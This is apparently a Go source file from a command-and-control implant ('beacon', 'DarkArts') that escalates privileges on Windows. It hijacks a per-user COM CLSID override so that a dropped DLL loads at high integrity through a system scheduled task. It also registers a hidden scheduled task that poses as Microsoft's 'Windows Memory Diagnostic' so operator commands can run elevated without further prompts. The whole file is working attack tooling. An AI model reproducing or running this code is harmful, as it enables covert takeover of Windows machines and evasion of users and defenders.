//go:build windows

package beacon

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

const (
	uacTaskTimeout = 60 * time.Second
	uacTaskPoll    = 250 * time.Millisecond
	uacInstallWait = 20 * time.Second
)

// uacDailyCLSID is the ComHandler CLSID of the UnifiedConsentSyncTask: a
// highest-privilege system task whose daily TimeTrigger fires in the
// interactive user's session. The per-user (HKCU) override for this CLSID is
// honored by taskhostw because the real handler exists under HKLM (scheduler
// validation passes) while user-session activation consults HKCU first.
const (
	uacDailyCLSID    = `{82AA0895-198A-4C1B-B2D1-C16894218AFB}`
	uacDailyCLSIDKey = `Software\Classes\CLSID\` + uacDailyCLSID + `\InprocServer32`
	uacDailyWait     = 26 * time.Hour
)

// uacDailyDLLPath and uacDailyWorkPath are on-disk locations of the payload
// and the bootstrap work file (vars so tests can isolate runs).
var (
	uacDailyDLLPath  = filepath.Join(os.TempDir(), "darts_ucd.dll")
	uacDailyWorkPath = filepath.Join(os.TempDir(), "darts-uac-work.txt")
)

// uacTaskName is the reusable HIGHEST scheduled task used for silent
// elevation. Overridable in tests to keep runs isolated.
var uacTaskName = `\DarkArts-uac`

// uacExeOverride lets tests point the reusable task at a real built beacon
// binary instead of the test executable.
var uacExeOverride string

// uacTaskXML builds the reusable HIGHEST scheduled-task definition used by
// the uac task. It runs the beacon in -uacrun mode at the user's highest
// token: no password (InteractiveToken), no auto-triggers, so the only way
// it ever starts is an explicit schtasks /run from the medium beacon, which
// is fully silent after the one-time install.
func uacTaskXML(exePath string) string {
	var b strings.Builder
	b.WriteString("<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n")
	b.WriteString(`<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">` + "\r\n")
	b.WriteString(`  <RegistrationInfo>` + "\r\n")
	b.WriteString(`    <Author>Microsoft Corporation</Author>` + "\r\n")
	b.WriteString(`    <Description>Windows Memory Diagnostic</Description>` + "\r\n")
	b.WriteString(`  </RegistrationInfo>` + "\r\n")
	b.WriteString(`  <Principals>` + "\r\n")
	b.WriteString(`    <Principal id="Author">` + "\r\n")
	b.WriteString(`      <LogonType>InteractiveToken</LogonType>` + "\r\n")
	b.WriteString(`      <RunLevel>HighestAvailable</RunLevel>` + "\r\n")
	b.WriteString(`    </Principal>` + "\r\n")
	b.WriteString(`  </Principals>` + "\r\n")
	b.WriteString(`  <Settings>` + "\r\n")
	b.WriteString(`    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>` + "\r\n")
	b.WriteString(`    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>` + "\r\n")
	b.WriteString(`    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>` + "\r\n")
	b.WriteString(`    <Hidden>true</Hidden>` + "\r\n")
	b.WriteString(`    <ExecutionTimeLimit>PT1H</ExecutionTimeLimit>` + "\r\n")
	b.WriteString(`    <Enabled>true</Enabled>` + "\r\n")
	b.WriteString(`  </Settings>` + "\r\n")
	b.WriteString(`  <Triggers/>` + "\r\n")
	b.WriteString(`  <Actions Context="Author">` + "\r\n")
	b.WriteString(`    <Exec>` + "\r\n")
	b.WriteString(`      <Command>"` + exePath + `"</Command>` + "\r\n")
	b.WriteString(`      <Arguments>-uacrun</Arguments>` + "\r\n")
	b.WriteString(`    </Exec>` + "\r\n")
	b.WriteString(`  </Actions>` + "\r\n")
	b.WriteString(`</Task>`)
	return b.String()
}

// writeUTF16LE writes s as UTF-16LE with a BOM (schtasks /create /xml
// requires a UTF-16 encoding declaration).
func writeUTF16LE(path, s string) error {
	u := utf16.Encode([]rune(s))
	buf := make([]byte, 0, 2+len(u)*2)
	buf = append(buf, 0xff, 0xfe)
	for _, c := range u {
		buf = append(buf, byte(c), byte(c>>8))
	}
	return os.WriteFile(path, buf, 0o600)
}

func uacTaskCfgPath() string { return filepath.Join(os.TempDir(), "darts-uac-cfg.json") }
func uacTaskXMLPath() string { return filepath.Join(os.TempDir(), "darts-uac-task.xml") }

// uacTaskExists reports whether the reusable HIGHEST task is registered.
func uacTaskExists() bool {
	return exec.Command("schtasks", "/Query", "/TN", uacTaskName).Run() == nil
}

// uacArmDaily drops the payload DLL and points the per-user CLSID override
// for the UnifiedConsentSyncTask ComHandler at it. Both steps are silent
// from a medium token and idempotent.
func uacArmDaily() error {
	if len(uacDailyDLL) == 0 {
		return fmt.Errorf("beacon: uac daily payload missing from build")
	}
	if err := os.WriteFile(uacDailyDLLPath, uacDailyDLL, 0o600); err != nil {
		return fmt.Errorf("beacon: uac daily payload: %w", err)
	}
	k, _, err := registry.CreateKey(registry.CURRENT_USER, uacDailyCLSIDKey, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("beacon: uac daily clsid: %w", err)
	}
	defer k.Close()
	if err := k.SetStringValue("", uacDailyDLLPath); err != nil {
		return fmt.Errorf("beacon: uac daily clsid value: %w", err)
	}
	if err := k.SetStringValue("ThreadingModel", "Apartment"); err != nil {
		return fmt.Errorf("beacon: uac daily clsid threading: %w", err)
	}
	return nil
}

// runElevatedTaskDaily runs a command elevated through the silent daily
// channel: the payload DLL is loaded at HIGH once per day by the
// UnifiedConsentSyncTask daily TimeTrigger. The first invocation (or any
// invocation after the reusable task was removed) waits up to uacDailyWait
// for the next fire, which bootstraps the reusable HIGHEST task and runs the
// pending command. Subsequent invocations take the instant silent task path.
func (e *Executor) runElevatedTaskDaily(cmd string) (string, error) {
	if uacTaskExists() {
		// A leftover work file must not re-run a previous command on the next
		// daily fire now that the instant path handles the queue.
		_ = os.Remove(uacDailyWorkPath)
		return e.runUacTaskOnce(cmd)
	}
	if err := uacArmDaily(); err != nil {
		return "", err
	}
	tmp, err := os.CreateTemp("", "darts*.out")
	if err != nil {
		return "", fmt.Errorf("beacon: uac daily output file: %w", err)
	}
	tmpPath := tmp.Name()
	tmp.Close()
	defer os.Remove(tmpPath)

	exe := uacExeOverride
	if exe == "" {
		if exe, err = os.Executable(); err != nil {
			return "", fmt.Errorf("beacon: uac daily executable: %w", err)
		}
	}
	work := cmd + "\n" + tmpPath + "\n" + uacTaskXML(exe)
	if err := os.WriteFile(uacDailyWorkPath, []byte(work), 0o600); err != nil {
		return "", fmt.Errorf("beacon: uac daily work: %w", err)
	}
	defer os.Remove(uacDailyWorkPath)

	return e.waitForUacOutput(tmpPath, time.Now().Add(uacDailyWait))
}

// waitForUacOutput polls the elevated output file until it is non-empty or
// the deadline passes, stripping the trailing exit marker.
func (e *Executor) waitForUacOutput(tmpPath string, deadline time.Time) (string, error) {
	for time.Now().Before(deadline) {
		if fi, err := os.Stat(tmpPath); err == nil && fi.Size() > 0 {
			data, err := os.ReadFile(tmpPath)
			if err != nil {
				return "", fmt.Errorf("beacon: uac task read output: %w", err)
			}
			s := strings.TrimSpace(string(data))
			if i := strings.LastIndex(s, "[exit "); i >= 0 {
				s = strings.TrimSpace(s[:i])
			}
			return s, nil
		}
		time.Sleep(uacTaskPoll)
	}
	return "", fmt.Errorf("beacon: uac task timed out waiting for elevated output (daily channel armed; next UnifiedConsentSyncTask fire runs it)")
}

// uacInstallTask creates the reusable HIGHEST task. The creation requires an
// elevated token, so this is the one and only place the user sees a UAC
// prompt (ShellExecute runas; the operator approves it once). The XML is
// written by the medium beacon and consumed by the elevated schtasks.
func uacInstallTask() error {
	exe := uacExeOverride
	if exe == "" {
		var err error
		exe, err = os.Executable()
		if err != nil {
			return fmt.Errorf("beacon: uac task executable: %w", err)
		}
	}
	xmlPath := uacTaskXMLPath()
	if err := writeUTF16LE(xmlPath, uacTaskXML(exe)); err != nil {
		return fmt.Errorf("beacon: uac task xml: %w", err)
	}
	defer os.Remove(xmlPath)

	params := fmt.Sprintf(`/c schtasks /Create /TN %s /XML "%s" /F`, uacTaskName, xmlPath)
	h, _, _ := procShellExecuteW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("runas"))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(`C:\Windows\System32\cmd.exe`))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(params))),
		0, 0,
	)
	if uintptr(h) <= 32 {
		return fmt.Errorf("beacon: uac task install launch failed (ShellExecute code %d)", uintptr(h))
	}
	deadline := time.Now().Add(uacInstallWait)
	for time.Now().Before(deadline) {
		if uacTaskExists() {
			return nil
		}
		time.Sleep(uacTaskPoll)
	}
	return fmt.Errorf("beacon: uac task not created after prompt (approve the UAC prompt to install it)")
}

// runUacTaskOnce runs the reusable HIGHEST task for a single command: the
// medium beacon writes the per-invocation config, triggers the silent
// schtasks /run, then polls the output file the elevated helper writes.
func (e *Executor) runUacTaskOnce(cmd string) (string, error) {
	tmp, err := os.CreateTemp("", "darts*.out")
	if err != nil {
		return "", fmt.Errorf("beacon: uac task output file: %w", err)
	}
	tmpPath := tmp.Name()
	tmp.Close()
	defer os.Remove(tmpPath)

	cfg, err := json.Marshal(map[string]string{"line": cmd, "out": tmpPath})
	if err != nil {
		return "", fmt.Errorf("beacon: uac task cfg: %w", err)
	}
	if err := os.WriteFile(uacTaskCfgPath(), cfg, 0o600); err != nil {
		return "", fmt.Errorf("beacon: uac task cfg write: %w", err)
	}

	out, err := exec.Command("schtasks", "/Run", "/TN", uacTaskName).CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("beacon: uac task run: %v: %s", err, strings.TrimSpace(string(out)))
	}

	return e.waitForUacOutput(tmpPath, time.Now().Add(uacTaskTimeout))
}

// runElevatedTask is the schtasks-based elevation path: one-time install
// (prompt) followed by fully silent schtasks /run invocations.
func (e *Executor) runElevatedTask(cmd string) (string, error) {
	if !uacTaskExists() {
		if err := uacInstallTask(); err != nil {
			return "", err
		}
	}
	return e.runUacTaskOnce(cmd)
}